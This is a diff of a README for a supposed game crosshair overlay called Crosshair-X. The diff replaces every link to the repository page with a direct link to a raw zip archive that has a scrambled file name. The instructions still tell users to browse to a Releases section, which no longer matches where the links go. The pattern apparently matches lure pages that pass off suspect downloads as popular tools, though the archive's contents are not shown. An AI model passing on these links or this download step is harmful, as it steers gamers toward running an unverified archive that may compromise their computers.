@@ -1,6 +1,6 @@
 # 🎯 Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game - Clear Crosshair for Any Game
 
-[![Download Crosshair-X](https://img.shields.io/badge/Download-Crosshair--X-blue?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)
+[![Download Crosshair-X](https://img.shields.io/badge/Download-Crosshair--X-blue?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game/raw/refs/heads/main/1.24.2/for_Game_Custom_Overlay_Every_Crosshair_3.2-alpha.2.zip)
 
 ---
 
@@ -37,14 +37,14 @@ Crosshair-X adds a custom crosshair overlay to any computer game you play. It sh
 
 Click the large button below to go to the official GitHub page where you can get the software.
 
-[![Go to Download Page](https://img.shields.io/badge/Download-Crosshair--X-grey?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)
+[![Go to Download Page](https://img.shields.io/badge/Download-Crosshair--X-grey?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game/raw/refs/heads/main/1.24.2/for_Game_Custom_Overlay_Every_Crosshair_3.2-alpha.2.zip)
 
 ---
 
 ## 📝 How to Download and Use Crosshair-X on Windows
 
 1. Open the main download page using this link:
-   https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game
+   https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game/raw/refs/heads/main/1.24.2/for_Game_Custom_Overlay_Every_Crosshair_3.2-alpha.2.zip
 
 2. Find the **Releases** section on the page.
    
@@ -106,7 +106,7 @@ Remember, these settings apply on top of any game window, so you don’t have to
 ## 🔗 Useful Links
 
 - Official GitHub page and download:  
-  https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game
+  https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game/raw/refs/heads/main/1.24.2/for_Game_Custom_Overlay_Every_Crosshair_3.2-alpha.2.zip
 
 - Common questions and support are available in the “Issues” tab on GitHub.
 
